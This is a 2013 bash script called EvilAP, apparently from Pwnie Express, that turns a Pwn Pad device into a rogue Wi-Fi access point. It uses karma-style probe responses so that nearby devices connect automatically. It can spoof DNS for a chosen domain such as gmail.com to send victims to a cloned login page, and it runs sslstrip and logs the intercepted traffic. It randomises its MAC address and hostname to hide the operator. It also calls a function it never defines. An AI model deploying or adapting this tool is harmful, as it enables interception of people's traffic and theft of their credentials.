#!/bin/bash
#Date: March 2013
#Desc: EvilAP script to forcefully connect wireless clients
#Authors: Awk, Sedd, Pasties
#Company: Pwnie Express
#Version: 1.0

##################################################
f_modprobe(){
#load all modules for external adapters:
mkdir -p /dev/net/
ln -s /dev/tun /dev/net/tun
modprobe ath9k_htc
modprobe btusb
modprobe tun
}

##################################################
f_restore_ident(){
  ifconfig wlan1 down
  macchanger -p wlan1
  hostname pwnpad
}

trap f_endclean INT
trap f_endclean KILL

##################################################
f_clean_up() {
  echo
  echo "Killing any previous instances of airbase or dhcpd"
  echo
  killall airbase-ng
  killall dhcpd
  killall dnsmasq
  killall sslstrip
  airmon-ng stop mon0
  iptables --flush
  iptables --table nat --flush
}

##################################################
f_endclean(){
  f_clean_up
  f_restore_ident
  exit
}

##################################################
f_interface(){
  clear

    echo "		Welcome to the EvilAP" 
    echo
    echo "Select which interface you are using for Internet? (1-3):"
    echo
    echo "1. [rmnet0] (3G GSM connection)"
    echo "2. eth0  (USB ethernet adapter)"
    echo "3. wlan0  (Internal Nexus Wifi)"
    echo

    read -p "Choice: " interfacechoice

  case $interfacechoice in
    1) f_rmnet0 ;;
    2) f_eth0 ;;
    3) f_wlan0 ;;
    *) f_rmnet0 ;;
  esac
}

#########################################
f_rmnet0(){
  interface=rmnet0
}


#########################################
f_eth0(){
  interface=eth0
}

#########################################
f_wlan0(){
  interface=wlan0
}

#########################################
f_ssid(){
  clear
  echo
  read -p "Enter an SSID name [attwifi]: " ssid
  echo

  if [ -z $ssid ]
  then
    ssid=attwifi
  fi
}

########################################
f_channel(){
  clear
  echo
  read -p "Enter the channel to run the EvilAP on (1-14): " channel
  echo
  
}

##########################################
f_dnsmasq(){
  
  clear
  echo
  echo "Do you want to spoof a DNS name to point back to EvilAP address?" 
  echo
  echo "Use with SET website cloner to redirect wireless client to fake page to harvest credentials."
  echo "(Example: gmail.com)"
  echo
  echo "1. Yes"
  echo "2. No"
  echo
  read -p "Choice: " dnschoice

  if [ -z $dnschoice ] 
    then 
      dnschoice="1"
  fi

   if [ $dnschoice -eq 1 ]
    then
    echo
    read -p "Enter DNS name to spoof (Example: gmail.com): " dnshost
    echo
    echo "DNSmasq running redirecting $dnshost to EvilAP IP address 192.168.7.1"
   fi


}

##########################################
f_dnsmasqrun(){

  if [ $dnschoice -eq 1 ]
    then
  	dnsmasq -i at0 --address=/$dnshost/192.168.7.1 -c /etc/dnsmasq.conf
    else
        dnsmasq -i at0 -c /etc/dnsmasq.conf
  fi

}

##########################################
f_sslstrip(){
  
  clear
  echo
  echo "Run SSLstrip with EvilAP?" 
  echo
  echo
  echo "1. Yes"
  echo "2. No"
  echo
  read -p "Choice: " sslstrip

  if [ -z $sslstrip ] 
    then 
      sslstrip="1"
    fi

}

##########################################
f_sslstriprun(){


DEFS="/opt/pwnpad/easy-creds/definitions.sslstrip"

sslstripfilename=sslstrip$(date +%F-%H%M).log

    if [ $sslstrip -eq 1 ]
    then 
 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888

	sslstrip -pfk -w /opt/pwnpad/captures/sslstrip/$sslstripfilename  -l 8888 at0 &
    
    fi

}

##########################################
f_preplaunch(){
  #Change the hostname and mac address randomly

  ifconfig wlan1 down

  macchanger -r wlan1

  echo "Rolling MAC address and Hostname randomly:"
  echo

  hn=`ifconfig wlan1 |grep HWaddr |awk '{print$5}' |awk -F":" '{print$1$2$3$4$5$6}'`
  hostname $hn

  echo $hn

  sleep 2

  echo 

  #Put wlan1 into monitor mode - mon0 created
  airmon-ng start wlan1
}
#########################################
f_evilap(){
  #Log path and name
  logname="/opt/pwnpad/captures/evilap-$(date +%s).log"

  #Start Airbase-ng with -P for preferred networks 
  airbase-ng -P -C 30 -c $channel -e "$ssid" -v mon0 > $logname 2>&1 & 
  sleep 2

  #Bring up virtual interface at0
  ifconfig at0 up 192.168.7.1 netmask 255.255.255.0

  #Start DHCP server on at0
  dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0

  #IP forwarding and iptables routing using internet connection
  echo 1 > /proc/sys/net/ipv4/ip_forward
  iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE

  f_dnsmasqrun
  f_sslstriprun
  
  tail -f $logname
}

#########################################
f_niceap(){
  #Log path and name
  logname="/opt/pwnpad/captures/evilap-$(date +%s).log"

  #Start Airbase-ng with -P for preferred networks 
  airbase-ng -C 30 -c $channel -e "$ssid" -v mon0 > $logname 2>&1 &
  sleep 2

  #Bring up virtual interface at0
  ifconfig at0 up 192.168.7.1 netmask 255.255.255.0

  #Start DHCP server on at0
  dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0

  #IP forwarding and iptables routing using internet connection
  echo 1 > /proc/sys/net/ipv4/ip_forward
  iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE
  
  f_dnsmasqrun
  f_sslstriprun

  tail -f $logname
}

#########################################
f_karmaornot(){

  clear
  echo
  echo "Force clients to connect based on their probe requests? [default yes]: "
  echo
  echo "WARNING: Everything will start connecting to you if yes is selected"
  echo
  echo "1. Yes"
  echo "2. No"
  echo
  read -p "Choice: " karma

}

#########################################
f_run(){
  f_modprobe
  f_getmacaddress
  f_clean_up
  f_interface
  f_ssid
  f_channel
  f_karmaornot
  f_sslstrip
  f_dnsmasq
  f_preplaunch
  if [ -z $karma ]
  then
    karma="1"
  fi

  if [ $karma -eq 1 ]
  then
  f_evilap
  else
  f_niceap
  fi



}

f_run

